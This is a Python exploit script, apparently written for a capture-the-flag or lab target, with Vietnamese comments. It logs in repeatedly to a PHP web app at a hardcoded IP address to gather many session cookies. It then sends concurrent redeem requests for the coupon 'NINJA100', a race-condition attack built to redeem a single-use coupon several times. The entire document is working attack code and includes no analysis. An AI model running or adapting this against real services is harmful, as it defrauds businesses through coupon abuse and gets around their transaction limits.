import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "http://188.166.187.6:8070"
EMAIL = "331@3"
PASSWORD = "3"
COUPONS = ["NINJA25", "NINJA50", "NINJA100"]  # bạn có thể thử lần lượt

def login():
    """Login và trả về PHPSESSID"""
    url = f"{BASE}/app.php?action=auth"
    data = {"action": "login", "email": EMAIL, "password": PASSWORD}
    r = requests.post(url, data=data, allow_redirects=False)
    if "PHPSESSID" in r.cookies:
        return r.cookies.get("PHPSESSID")
    return None

def redeem(sessid, coupon):
    """Redeem coupon với session"""
    url = f"{BASE}/app.php?action=redeem"
    data = {"action": "redeem", "couponCode": coupon}
    cookies = {"PHPSESSID": sessid}
    r = requests.post(url, data=data, cookies=cookies)
    return r.status_code, r.text[:200] 

def main():
     
    sessids = [login() for _ in range(10)]
    sessids = [s for s in sessids if s]   

    print(f"[+] Got {len(sessids)} sessions")

 
    coupon = "NINJA100"  
    with ThreadPoolExecutor(max_workers=20) as exe:
        futures = [exe.submit(redeem, sid, coupon) for sid in sessids]
        for f in as_completed(futures):
            code, body = f.result()
            print(f"[REDEEM] {code} -> {body}")

if __name__ == "__main__":
    main()



